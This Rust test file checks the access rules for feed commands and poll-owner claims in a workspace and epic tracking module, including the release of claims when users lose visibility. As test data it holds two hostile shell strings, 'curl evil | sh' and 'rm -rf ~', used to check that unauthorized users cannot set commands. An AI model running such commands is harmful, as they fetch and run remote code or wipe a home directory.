//! Feed command authority and poll claims (`feeds.allium:
//! FeedCommandAuthority`, `FeedCommandRunsOnSettersHost`; `feeds.allium:
//! ClaimPollOwner`, `OverridePollOwner`; `workspaces.allium: ClaimsFollowSight`),
//! run against the in-memory store. Twins of the in-memory caller's
//! `src/sync/memory_caller/tests/feed_authority.rs`.

mod common;

use common::*;
use dispatch_spacetime_module::*;
#[allow(unused_imports)]
use spacetimedb::Table;

/// `root` is super-admin. `alice` (the epic's creator), `bob` and `carol` are
/// members of workspace A (`boss` administers it); `alice` and `bob` also
/// belong to B. Each person has
/// a host, `h-<name>`. Returns (store, A, B).
fn world() -> (Store, i64, i64) {
    let store = Store::bare();
    for who in ["root", "alice", "bob", "carol", "boss"] {
        store
            .call(who, |ctx| {
                stamp_rules_version_on_connect(ctx);
                Ok(())
            })
            .expect("connect");
    }
    store
        .call("root", |ctx| claim_super_admin(ctx))
        .expect("claim");
    let mut ids = Vec::new();
    for name in ["A", "B"] {
        store
            .call("root", |ctx| create_workspace(ctx, name.into()))
            .expect("workspace");
        ids.push(
            store
                .db()
                .workspaces()
                .iter()
                .find(|w| w.name == name)
                .expect("ws")
                .id,
        );
    }
    store
        .call("root", |ctx| {
            add_member(ctx, ids[0], identity_of("boss"), "admin".into())
        })
        .expect("admin");
    for (ws, who) in [
        (ids[0], "alice"),
        (ids[0], "bob"),
        (ids[0], "carol"),
        (ids[1], "alice"),
        (ids[1], "bob"),
    ] {
        store
            .call("root", |ctx| {
                add_member(ctx, ws, identity_of(who), "member".into())
            })
            .expect("member");
    }
    for who in ["alice", "bob", "carol"] {
        store.register_host_for(&format!("h-{who}"), who);
    }
    (store, ids[0], ids[1])
}

fn make_epic(store: &Store, who: &str, row: Epic) -> i64 {
    store
        .call(who, |ctx| create_epic(ctx, row))
        .expect("create_epic");
    store.db().epics().iter().map(|e| e.id).max().expect("epic")
}

/// alice's public feed epic in `a`.
fn feed_epic(store: &Store, a: i64) -> i64 {
    make_epic(
        store,
        "alice",
        Epic {
            title: "feed".into(),
            workspace_id: a,
            feed_command: "gh-feed".into(),
            ..blank_epic()
        },
    )
}

fn claim(store: &Store, who: &str, scope: &str, id: i64, host: &str) -> Result<(), String> {
    store.call(who, |ctx| {
        claim_poll_owner(ctx, scope.into(), id, host.into())
    })
}

fn override_to(store: &Store, who: &str, scope: &str, id: i64, host: &str) -> Result<(), String> {
    store.call(who, |ctx| {
        override_poll_owner(ctx, scope.into(), id, host.into())
    })
}

/// A claim row as an older release, or a host that claimed before the rule,
/// would have left it: written straight to the table.
fn legacy_claim(store: &Store, epic: i64, host: &str) {
    store.db().poll_owners().insert(PollOwner {
        id: 0,
        scope: "epic".into(),
        scope_id: epic,
        host: host.into(),
        claimed_at: String::new(),
    });
}

/// An unseen mark and a bookmark on `task` for each of `people`, written
/// straight to the tables so no reducer's own cleanup hides what is under test.
fn mark_task(store: &Store, task: i64, people: &[&str]) {
    for who in people {
        store.db().unseen_tasks().insert(UnseenTask {
            id: unseen_id(&identity_of(who), task),
            task_id: task,
            subscriber: identity_of(who),
        });
        store.db().bookmarks().insert(Bookmark {
            id: bookmark_id(&identity_of(who), task),
            task_id: task,
            subscriber: identity_of(who),
        });
    }
}

/// Who holds an (unseen mark, bookmark) on `task`, sorted.
fn marks_on(store: &Store, task: i64) -> (Vec<String>, Vec<String>) {
    let mut unseen: Vec<String> = store
        .db()
        .unseen_tasks()
        .iter()
        .filter(|u| u.task_id == task)
        .map(|u| u.subscriber)
        .collect();
    let mut bookmarks: Vec<String> = store
        .db()
        .bookmarks()
        .iter()
        .filter(|b| b.task_id == task)
        .map(|b| b.subscriber)
        .collect();
    unseen.sort();
    bookmarks.sort();
    (unseen, bookmarks)
}

fn claim_hosts(store: &Store) -> Vec<String> {
    let mut hosts: Vec<String> = store.db().poll_owners().iter().map(|p| p.host).collect();
    hosts.sort();
    hosts
}

fn set_command(store: &Store, who: &str, epic: i64, command: &str) -> Result<(), String> {
    store.call(who, |ctx| {
        patch_epic(
            ctx,
            epic,
            EpicPatch {
                feed_command: Some(command.into()),
                ..EpicPatch::default()
            },
        )
    })
}

// -- M2: who may change a command, and who is its setter ------------------------

#[test]
fn a_new_epic_with_a_command_records_its_creator_as_the_setter() {
    let (store, a, _) = world();
    let id = make_epic(
        &store,
        "carol",
        Epic {
            workspace_id: a,
            feed_command: "curl evil | sh".into(),
            feed_command_set_by: identity_of("bob"), // a client's claim is ignored
            ..blank_epic()
        },
    );
    assert_eq!(store.epic(id).feed_command_set_by, identity_of("carol"));
    let plain = make_epic(
        &store,
        "carol",
        Epic {
            workspace_id: a,
            ..blank_epic()
        },
    );
    assert_eq!(store.epic(plain).feed_command_set_by, "");
}

#[test]
fn the_owner_of_the_host_holding_the_claim_may_not_change_the_command() {
    let (store, a, _) = world();
    let epic = feed_epic(&store, a);
    legacy_claim(&store, epic, "h-carol");
    assert!(set_command(&store, "carol", epic, "rm -rf ~").is_err());
    assert_eq!(store.epic(epic).feed_command, "gh-feed");
}

#[test]
fn changing_the_command_records_the_setter_and_releases_other_claims() {
    let (store, a, _) = world();
    let epic = feed_epic(&store, a);
    legacy_claim(&store, epic, "h-alice");
    legacy_claim(&store, epic, "h-bob");
    set_command(&store, "boss", epic, "new-feed").expect("an admin may");
    assert_eq!(store.epic(epic).feed_command_set_by, identity_of("boss"));
    // boss has no host, so nobody's claim survives.
    assert!(claim_hosts(&store).is_empty());
}

#[test]
fn keeping_the_command_keeps_the_setter_and_the_claims() {
    let (store, a, _) = world();
    let epic = feed_epic(&store, a);
    legacy_claim(&store, epic, "h-bob");
    store
        .call("alice", |ctx| {
            patch_epic(
                ctx,
                epic,
                EpicPatch {
                    feed_command: Some("gh-feed".into()),
                    title: Some("renamed".into()),
                    ..EpicPatch::default()
                },
            )
        })
        .expect("patch");
    assert_eq!(store.epic(epic).feed_command_set_by, identity_of("alice"));
    assert_eq!(claim_hosts(&store), ["h-bob"]);
}

// -- M2: claiming and overriding need sight, and a feed epic its setter ----------

#[test]
fn a_claim_on_an_epic_the_caller_cannot_see_is_refused() {
    let (store, a, _) = world();
    let epic = feed_epic(&store, a);
    store
        .call("alice", |ctx| {
            set_epic_visibility(ctx, epic, "private".into())
        })
        .expect("private");
    assert!(claim(&store, "carol", "epic", epic, "h-carol").is_err());
    assert!(override_to(&store, "carol", "epic", epic, "h-carol").is_err());
    assert!(claim_hosts(&store).is_empty());
}

#[test]
fn a_claim_on_a_task_the_caller_cannot_see_is_refused() {
    let (store, _, _) = world();
    let task = store.create("alice", user_task("t", "alice"));
    assert!(claim(&store, "carol", "task", task, "h-carol").is_err());
    claim(&store, "alice", "task", task, "h-alice").expect("the owner may");
}

#[test]
fn a_claim_on_a_scope_that_does_not_exist_is_refused() {
    let (store, _, _) = world();
    assert!(claim(&store, "alice", "epic", 99, "h-alice").is_err());
    assert!(claim(&store, "alice", "task", 99, "h-alice").is_err());
}

#[test]
fn a_host_whose_owner_did_not_set_the_command_cannot_claim_the_feed() {
    let (store, a, _) = world();
    let epic = feed_epic(&store, a);
    assert!(claim(&store, "carol", "epic", epic, "h-carol").is_err());
    assert!(override_to(&store, "carol", "epic", epic, "h-carol").is_err());
    assert!(claim_hosts(&store).is_empty());
    claim(&store, "alice", "epic", epic, "h-alice").expect("the setter's host may");
    assert_eq!(claim_hosts(&store), ["h-alice"]);
}

#[test]
fn an_epic_without_a_command_can_be_claimed_by_any_host_that_sees_it() {
    let (store, a, _) = world();
    let epic = make_epic(
        &store,
        "alice",
        Epic {
            workspace_id: a,
            ..blank_epic()
        },
    );
    claim(&store, "carol", "epic", epic, "h-carol").expect("no command, nothing to run");
}

// -- M4: every loss-of-sight path releases the claims it strands ------------------

const LOSS_OF_SIGHT_PATHS: [&str; 6] = [
    "remove_member",
    "detach_a_task",
    "move_epic_to_workspace",
    "set_epic_visibility",
    "reparent_under_a_private_epic",
    "managed_root_made_private",
];

fn carol_loses_sight_by(path: &str, store: &Store, a: i64, epic: i64, task: i64) {
    match path {
        "detach_a_task" => {
            // Alice made the task, so she may detach it; carol cannot see a
            // task on alice's own board.
            store
                .call("alice", |ctx| set_task_epic(ctx, task, 0, String::new()))
                .expect("detach");
        }
        "remove_member" => {
            let id = store
                .db()
                .memberships()
                .iter()
                .find(|m| m.workspace_id == a && m.user == identity_of("carol"))
                .expect("membership")
                .id;
            store
                .call("root", |ctx| remove_member(ctx, id))
                .expect("remove");
        }
        "move_epic_to_workspace" => {
            let b = store
                .db()
                .workspaces()
                .iter()
                .find(|w| w.name == "B")
                .expect("B")
                .id;
            store
                .call("root", |ctx| move_epic_to_workspace(ctx, epic, b))
                .expect("move");
        }
        "set_epic_visibility" => {
            store
                .call("alice", |ctx| {
                    set_epic_visibility(ctx, epic, "private".into())
                })
                .expect("private");
        }
        "reparent_under_a_private_epic" => {
            let private = make_epic(
                store,
                "alice",
                Epic {
                    workspace_id: a,
                    visibility: "private".into(),
                    ..blank_epic()
                },
            );
            store
                .call("alice", |ctx| {
                    patch_epic(
                        ctx,
                        epic,
                        EpicPatch {
                            parent_epic_id: Some(private),
                            ..EpicPatch::default()
                        },
                    )
                })
                .expect("reparent");
        }
        "managed_root_made_private" => {
            // Written straight to the table: a patch of the command would
            // release the claims by itself and hide what is under test.
            let row = store.epic(epic);
            store.db().epics().id().update(Epic {
                feed_role: "reviews-parent".into(),
                ..row
            });
            store
                .call("alice", |ctx| {
                    ensure_managed_epics(ctx, "gh-feed".into(), 0, String::new(), 0)
                })
                .expect("ensure");
        }
        other => panic!("unknown loss-of-sight path {other}"),
    }
}

#[test]
fn every_loss_of_sight_path_releases_the_claims_it_strands() {
    for path in LOSS_OF_SIGHT_PATHS {
        let (store, a, _) = world();
        let epic = feed_epic(&store, a);
        legacy_claim(&store, epic, "h-alice");
        legacy_claim(&store, epic, "h-carol");
        // M10: both hosts also poll a task of that epic; a task claim follows
        // sight of the task, so it goes the same way.
        let task = store.create("alice", epic_task("t", epic, "backlog"));
        claim(&store, "alice", "task", task, "h-alice").expect("alice claims the task");
        claim(&store, "carol", "task", task, "h-carol").expect("carol claims the task");
        // B1: the marks follow the claims. Carol and alice both bookmark the
        // task and have it unseen; only carol loses sight of it.
        mark_task(&store, task, &["alice", "carol"]);
        carol_loses_sight_by(path, &store, a, epic, task);
        // A task move ends every unseen mark on its own
        // (`UnseenMarkEndsWithTheTaskLeavingItsEpic`).
        let alice_unseen = if path == "detach_a_task" {
            vec![]
        } else {
            vec![identity_of("alice")]
        };
        assert_eq!(
            marks_on(&store, task),
            (alice_unseen, vec![identity_of("alice")]),
            "{path}: carol's marks survived, or alice's were dropped"
        );
        let hosts = claim_hosts(&store);
        // A detach moves the task only: carol still sees the epic, so her
        // epic claim stays.
        assert!(
            path == "detach_a_task" || !hosts.contains(&"h-carol".to_string()),
            "{path}: carol's claim survived: {hosts:?}"
        );
        assert_eq!(
            hosts.iter().filter(|h| *h == "h-alice").count(),
            2,
            "{path}: alice's epic or task claim was released: {hosts:?}"
        );
    }
}

/// Bob's claim, and alice's and bob's marks, on a task of a public epic of
/// `a` (alice's). Returns the epic and the task.
fn task_held_by_alice_and_bob(store: &Store, a: i64) -> (i64, i64) {
    let epic = make_epic(
        store,
        "alice",
        Epic {
            workspace_id: a,
            ..blank_epic()
        },
    );
    let task = store.create("alice", epic_task("t", epic, "backlog"));
    // A task has one claim: bob's host holds it.
    claim(store, "bob", "task", task, "h-bob").expect("bob claims");
    mark_task(store, task, &["alice", "bob"]);
    (epic, task)
}

fn assert_nothing_is_held(store: &Store, task: i64, what: &str) {
    assert!(claim_hosts(store).is_empty(), "{what}: {:?}", claim_hosts(store));
    assert_eq!(marks_on(store, task), (vec![], vec![]), "{what}");
}

/// A2/B1: a task moved into a private epic leaves every other person's sight,
/// so their claim and marks end with it.
#[test]
fn a_task_move_into_a_private_epic_ends_the_claims_and_marks_it_strands() {
    let (store, a, _) = world();
    let (_, task) = task_held_by_alice_and_bob(&store, a);
    // Only an admin may move a task into a private epic, so the admin's own.
    let private = make_epic(
        &store,
        "boss",
        Epic {
            workspace_id: a,
            visibility: "private".into(),
            ..blank_epic()
        },
    );
    store
        .call("boss", |ctx| set_task_epic(ctx, task, private, String::new()))
        .expect("move");
    assert_nothing_is_held(&store, task, "move into a private epic");
}

/// A2/B1: the same through `update_task`, the board's own call.
#[test]
fn update_task_into_a_private_epic_ends_the_claims_and_marks_it_strands() {
    let (store, a, _) = world();
    let (_, task) = task_held_by_alice_and_bob(&store, a);
    let private = make_epic(
        &store,
        "boss",
        Epic {
            workspace_id: a,
            visibility: "private".into(),
            ..blank_epic()
        },
    );
    store
        .call("boss", |ctx| {
            update_task(
                ctx,
                task,
                Some(private),
                identity_of("boss"),
                String::new(),
                TaskPatch::default(), String::new(), None,
            )
        })
        .expect("move");
    assert_nothing_is_held(&store, task, "update_task into a private epic");
}

/// A2/B1: an admin detaches alice's task onto the admin's board. Alice and
/// bob lose sight of it.
#[test]
fn a_detach_ends_the_claims_and_marks_of_everyone_but_the_new_owner() {
    let (store, a, _) = world();
    let (_, task) = task_held_by_alice_and_bob(&store, a);
    store
        .call("boss", |ctx| set_task_epic(ctx, task, 0, String::new()))
        .expect("the admin detaches");
    assert_nothing_is_held(&store, task, "detach");
}

/// A moved task that everyone still sees keeps its claims and marks.
#[test]
fn a_task_move_between_public_epics_keeps_claims_and_marks() {
    let (store, a, _) = world();
    let (_, task) = task_held_by_alice_and_bob(&store, a);
    let other = make_epic(
        &store,
        "alice",
        Epic {
            workspace_id: a,
            ..blank_epic()
        },
    );
    store
        .call("alice", |ctx| set_task_epic(ctx, task, other, String::new()))
        .expect("move");
    assert_eq!(claim_hosts(&store), vec!["h-bob".to_string()]);
    assert_eq!(marks_on(&store, task).1.len(), 2);
}

/// A2 (decided with the user): a detach is refused while another person's
/// host holds a current agent on the task.
#[test]
fn a_detach_is_refused_while_another_persons_host_runs_an_agent_on_it() {
    let (store, a, _) = world();
    let (epic, task) = task_held_by_alice_and_bob(&store, a);
    store.db().agents().insert(Agent {
        id: 0,
        task_id: task,
        name: "bobs-agent".into(),
        host: "h-bob".into(),
        start_mode: "dispatch".into(),
        state: "current".into(),
        started_at: String::new(),
        ended_at: String::new(),
        end_reason: String::new(),
        tmux_window: String::new(),
        last_pre_tool_use_at: String::new(),
        last_notification_at: String::new(),
        live_subagents: 0,
        stop_pending: false,
        stop_pending_at: String::new(),
    });
    let why = store
        .call("boss", |ctx| set_task_epic(ctx, task, 0, String::new()))
        .unwrap_err();
    assert!(why.contains("another person's host"), "{why}");
    assert_eq!(store.task(task).epic_id, epic);
    assert_eq!(claim_hosts(&store).len(), 1, "a refused move releases nothing");
}

/// A detach is not blocked by an agent on the caller's own host.
#[test]
fn a_detach_is_not_refused_for_an_agent_on_the_callers_own_host() {
    let (store, a, _) = world();
    let (_, task) = task_held_by_alice_and_bob(&store, a);
    store.db().agents().insert(Agent {
        id: 0,
        task_id: task,
        name: "boss-agent".into(),
        host: "h-alice".into(),
        start_mode: "dispatch".into(),
        state: "current".into(),
        started_at: String::new(),
        ended_at: String::new(),
        end_reason: String::new(),
        tmux_window: String::new(),
        last_pre_tool_use_at: String::new(),
        last_notification_at: String::new(),
        live_subagents: 0,
        stop_pending: false,
        stop_pending_at: String::new(),
    });
    store
        .call("alice", |ctx| set_task_epic(ctx, task, 0, String::new()))
        .expect("alice's own host runs it");
}

/// A8: a detach leaves the workspace, so the task's package links go.
#[test]
fn a_detach_unlinks_the_task_from_its_workspaces_packages() {
    let (store, a, _) = world();
    let (_, task) = task_held_by_alice_and_bob(&store, a);
    store
        .call("alice", |ctx| {
            create_work_package(
                ctx,
                WorkPackage {
                    id: 0,
                    title: "p".into(),
                    description: String::new(),
                    sort_order: None,
                    created_by: String::new(),
                    created_at: String::new(),
                    updated_at: String::new(),
                    workspace_id: a,
                    visibility: "public".into(),
                },
            )
        })
        .expect("package");
    let package = store
        .db()
        .work_packages()
        .iter()
        .map(|p| p.id)
        .max()
        .expect("package");
    store
        .call("alice", |ctx| {
            link_work_package_item(ctx, package, "task".into(), task)
        })
        .expect("link");
    store
        .call("boss", |ctx| set_task_epic(ctx, task, 0, String::new()))
        .expect("detach");
    assert_eq!(store.db().work_package_links().iter().count(), 0);
}

#[test]
fn a_visibility_flip_also_releases_claims_on_the_sub_epics() {
    let (store, a, _) = world();
    let root = feed_epic(&store, a);
    let sub = make_epic(
        &store,
        "alice",
        Epic {
            workspace_id: a,
            parent_epic_id: root,
            ..blank_epic()
        },
    );
    legacy_claim(&store, sub, "h-carol");
    store
        .call("alice", |ctx| {
            set_epic_visibility(ctx, root, "private".into())
        })
        .expect("private");
    assert!(claim_hosts(&store).is_empty());
}

// -- M9: claims held before the setter rule ------------------------------------

/// Put the store back to the module just before the setter-claims sweep, then
/// connect: the one moment the sweep runs.
fn upgrade_from_before_the_sweep(store: &Store) {
    store
        .call("root", |ctx| {
            ctx.db.rules_version().id().update(RulesVersion {
                id: 1,
                version: FEED_SETTER_CLAIMS_RULES_VERSION - 1,
            });
            Ok(())
        })
        .expect("rewind");
    store
        .call("alice", |ctx| {
            stamp_rules_version_on_connect(ctx);
            Ok(())
        })
        .expect("connect");
}

/// `FeedCommandRunsOnSettersHost`: carol's host claimed alice's shared feed
/// before the rule. After the upgrade neither host may run it. The one-time
/// sweep releases the claim of a host whose owner did not set the command, so
/// the setter's host can claim the feed.
#[test]
fn the_upgrade_releases_a_claim_held_by_a_host_that_may_not_run_the_command() {
    let (store, a, _) = world();
    let epic = feed_epic(&store, a);
    legacy_claim(&store, epic, "h-carol");
    upgrade_from_before_the_sweep(&store);
    assert!(claim_hosts(&store).is_empty());
    claim(&store, "alice", "epic", epic, "h-alice").expect("the setter's host may claim now");
}

/// The sweep leaves every claim that is workable: the setter's own, one on an
/// epic with no command, and a task-scoped one.
#[test]
fn the_upgrade_keeps_the_claims_that_are_workable() {
    let (store, a, _) = world();
    let feed = feed_epic(&store, a);
    legacy_claim(&store, feed, "h-alice");
    let plain = make_epic(
        &store,
        "alice",
        Epic {
            title: "plain".into(),
            workspace_id: a,
            ..blank_epic()
        },
    );
    legacy_claim(&store, plain, "h-carol");
    let task = store.create("alice", epic_task("t", plain, "backlog"));
    claim(&store, "carol", "task", task, "h-carol").expect("a task claim");
    upgrade_from_before_the_sweep(&store);
    assert_eq!(claim_hosts(&store), ["h-alice", "h-carol", "h-carol"]);
}

/// Once: a store already on the new rules is not swept again by a later
/// connection.
#[test]
fn a_later_connection_does_not_sweep_again() {
    let (store, a, _) = world();
    let epic = feed_epic(&store, a);
    upgrade_from_before_the_sweep(&store);
    legacy_claim(&store, epic, "h-carol");
    store
        .call("bob", |ctx| {
            stamp_rules_version_on_connect(ctx);
            Ok(())
        })
        .expect("connect");
    assert_eq!(claim_hosts(&store), ["h-carol"]);
}
